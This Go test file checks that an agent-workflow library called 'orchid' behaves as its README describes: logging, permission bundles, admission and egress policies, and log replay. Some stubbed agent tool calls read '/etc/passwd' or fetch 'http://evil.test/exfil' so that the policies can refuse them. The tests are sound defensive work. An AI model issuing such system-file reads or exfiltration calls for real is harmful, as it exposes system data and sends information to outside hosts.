package orchid_test

import (
	"bytes"
	"context"
	"errors"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/mr-joshcrane/orchid"
	"github.com/mr-joshcrane/orchid/orchidx"
)

func stubGen(text string) orchid.Generator {
	return orchid.GeneratorFunc(func(ctx orchid.Context) orchid.Proposal {
		return orchid.Proposal{Text: text}
	})
}

func callOnce(tool string, args map[string]string) orchid.Generator {
	var called bool
	return orchid.GeneratorFunc(func(ctx orchid.Context) orchid.Proposal {
		if called {
			return orchid.Proposal{Text: "done"}
		}
		called = true
		return orchid.Proposal{
			Text:    "calling",
			Effects: []orchid.ProposedEffect{{Tool: tool, Args: args}},
		}
	})
}

func TestREADME_Quickstart(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "main.go"), []byte("package main\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	logDir := filepath.Join(dir, "logs")

	text, _, err := orchid.MustRun(context.Background(), stubGen("summary"), "analyst", "Summarise this project.",
		orchid.WithRootDir(dir),
		orchid.WithLogDir(logDir),
		orchid.WithTools(
			orchid.ReadTool("."),
			orchid.ListTool("."),
			orchid.SearchTool("."),
		),
	)
	if err != nil {
		t.Fatalf("MustRun: %v", err)
	}
	if text != "summary" {
		t.Errorf("text = %q", text)
	}

	// The README promises audit.txt and tree.txt alongside the jsonl.
	entries, err := os.ReadDir(logDir)
	if err != nil {
		t.Fatal(err)
	}
	var haveAudit, haveTree, haveJSONL bool
	for _, e := range entries {
		switch {
		case strings.HasSuffix(e.Name(), "-audit.txt"):
			haveAudit = true
		case strings.HasSuffix(e.Name(), "-tree.txt"):
			haveTree = true
		case strings.HasSuffix(e.Name(), "-events.jsonl"):
			haveJSONL = true
		}
	}
	if !haveAudit || !haveTree || !haveJSONL {
		t.Errorf("want audit.txt, tree.txt and events.jsonl; got %v", entries)
	}
}

func TestREADME_ConstructorAndMiddleware(t *testing.T) {
	dir := t.TempDir()
	readTool := orchid.ReadTool(dir)
	writeTool := orchid.Tool{
		Name:        "write",
		Description: "writes",
		Params:      map[string]orchid.Param{"path": {Type: "string", Required: true}},
		Handler:     func(map[string]string) (string, error) { return "ok", nil },
	}

	wf, err := orchid.NewWorkflowWithOptions(stubGen("done"),
		orchid.WithRootDir(dir),
		orchid.WithTools(readTool, writeTool.With(orchidx.Timeout(5*time.Second))),
		orchid.WithEffectConcurrency(4),
	)
	if err != nil {
		t.Fatalf("NewWorkflowWithOptions: %v", err)
	}
	defer wf.Close()

	wf.Use(orchidx.CapOutput(32_000))
}

func TestREADME_MisconfiguredToolIsAnError(t *testing.T) {
	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("README promises an error, not a panic; got %v", r)
		}
	}()
	if _, err := orchid.NewWorkflowWithOptions(stubGen("x"), orchid.WithTools(orchid.Tool{Name: "bad"})); err == nil {
		t.Fatal("expected a configuration error")
	}
}

func TestREADME_PermissionBundle(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "f.txt"), []byte("hello"), 0o644); err != nil {
		t.Fatal(err)
	}

	wf, err := orchid.NewWorkflowWithOptions(
		callOnce("read", map[string]string{"path": "f.txt"}),
		orchid.WithRootDir(dir),
		orchid.WithTools(orchid.ReadTool(dir)),
	)
	if err != nil {
		t.Fatal(err)
	}
	wf.RegisterPermissionBundle(orchid.PermissionReadOnlyFS, "read", "list", "search")

	// Grant only the bundle, and check it expands to cover "read".
	p := wf.Spawn("reader", "reads", nil, "")
	p.Permissions = map[orchid.Permission]bool{orchid.PermissionReadOnlyFS: true}
	p.Tools = []orchid.ToolDefinition{{Name: "read"}}
	p.View.Filter = func(e orchid.Event) bool { return e.ProcessID == p.ID }
	wf.Inject(p.ID, "go")

	_, results, _, _ := wf.Step(context.Background(), p.ID)
	if len(results) == 0 {
		t.Fatal("expected a result")
	}
	if !results[0].Admitted {
		t.Fatalf("bundle should expand to read, got refusal: %s", results[0].Error)
	}
}

func TestREADME_AdmissionPolicy(t *testing.T) {
	dir := t.TempDir()
	wf, err := orchid.NewWorkflowWithOptions(
		callOnce("read", map[string]string{"path": "/etc/passwd"}),
		orchid.WithRootDir(dir),
		orchid.WithTools(orchid.ReadTool(dir)),
	)
	if err != nil {
		t.Fatal(err)
	}
	wf.Effects.AddPolicy(func(p *orchid.Process, e *orchid.Effect) (bool, string) {
		if strings.HasPrefix(e.Args["path"], "/etc") {
			return false, "path is out of bounds"
		}
		return true, ""
	})

	if _, _, err := wf.Run(context.Background(), "p", "go"); err != nil {
		t.Fatal(err)
	}

	var refused bool
	for _, e := range wf.Log.All() {
		if e.Type == orchid.EventEffectRejected && e.Data[orchid.KeyReason] == "path is out of bounds" {
			refused = true
		}
	}
	if !refused {
		t.Error("policy did not refuse the call")
	}
}

func TestREADME_ContextPolicyChain(t *testing.T) {
	policy := orchidx.Chain(
		orchidx.EvictToolResults(3),
		orchidx.PhasedPurpose([]orchidx.Phase{
			{Step: 0, Purpose: "explore"},
			{Step: 5, Purpose: "conclude"},
		}),
	)

	purpose, history := policy(6, "original", nil)
	if purpose != "conclude" {
		t.Errorf("purpose at step 6 = %q, want %q", purpose, "conclude")
	}
	if history != nil {
		t.Errorf("empty history should stay empty, got %v", history)
	}
}

func TestREADME_ReplayFromLog(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "f.txt"), []byte("hello"), 0o644); err != nil {
		t.Fatal(err)
	}

	wf, err := orchid.NewWorkflowWithOptions(
		callOnce("read", map[string]string{"path": "f.txt"}),
		orchid.WithRootDir(dir),
		orchid.WithTools(orchid.ReadTool(dir)),
	)
	if err != nil {
		t.Fatal(err)
	}
	if _, _, err := wf.Run(context.Background(), "p", "go"); err != nil {
		t.Fatal(err)
	}

	var buf bytes.Buffer
	if _, err := wf.Log.WriteTo(&buf); err != nil {
		t.Fatal(err)
	}

	events, err := orchid.ReadEvents(&buf)
	if err != nil {
		t.Fatalf("ReadEvents: %v", err)
	}
	if got := orchid.DeriveMessages(events); len(got) == 0 {
		t.Fatal("replayed log derived an empty transcript")
	}
}

func TestREADME_ContextLimitOverride(t *testing.T) {
	// The Bedrock constructor needs AWS config, so the OpenAI generator stands in
	// for the documented option pair; both expose the same override.
	gen := orchid.NewOpenAIGenerator("http://localhost:1",
		orchid.OpenAIWithModel("anthropic.claude-opus-5"),
		orchid.OpenAIWithContextLimit(1_000_000),
	)
	limiter, ok := any(gen).(interface{ ModelLimit() int })
	if !ok {
		t.Fatal("generator should implement ModelLimiter")
	}
	if got := limiter.ModelLimit(); got != 1_000_000 {
		t.Errorf("ModelLimit() = %d, want 1000000", got)
	}
}

func TestREADME_Egress(t *testing.T) {
	allowed := orchidx.NewAllowlist("api.example.com", "*.internal.corp")

	// Transport is the enforcement point.
	client := &http.Client{Transport: orchidx.Transport(allowed, nil)}
	if _, err := client.Get("http://evil.test/"); !errors.Is(err, orchidx.ErrEgressDenied) {
		t.Fatalf("want ErrEgressDenied, got %v", err)
	}

	// EgressPolicy is the admission check.
	dir := t.TempDir()
	wf, err := orchid.NewWorkflowWithOptions(
		callOnce("fetch", map[string]string{"url": "http://evil.test/exfil"}),
		orchid.WithRootDir(dir),
		orchid.WithTools(orchid.Tool{
			Name:        "fetch",
			Description: "fetches a url",
			Params:      map[string]orchid.Param{"url": {Type: "string", Required: true}},
			Handler:     func(map[string]string) (string, error) { return "should not run", nil },
		}),
	)
	if err != nil {
		t.Fatal(err)
	}
	wf.Effects.AddPolicy(orchidx.EgressPolicy(allowed))

	if _, _, err := wf.Run(context.Background(), "p", "go"); err != nil {
		t.Fatal(err)
	}

	var refused bool
	for _, e := range wf.Log.All() {
		if e.Type == orchid.EventEffectRejected && strings.Contains(e.Data[orchid.KeyReason], "egress denied") {
			refused = true
		}
	}
	if !refused {
		t.Error("the policy did not refuse the unlisted host, or did not record it")
	}

	// The documented matching rules.
	for host, want := range map[string]bool{
		"api.example.com":   true,
		"a.internal.corp":   true,
		"internal.corp":     false,
		"other.example.com": false,
	} {
		if got := allowed.Permits(host); got != want {
			t.Errorf("Permits(%q) = %v, want %v", host, got, want)
		}
	}
}
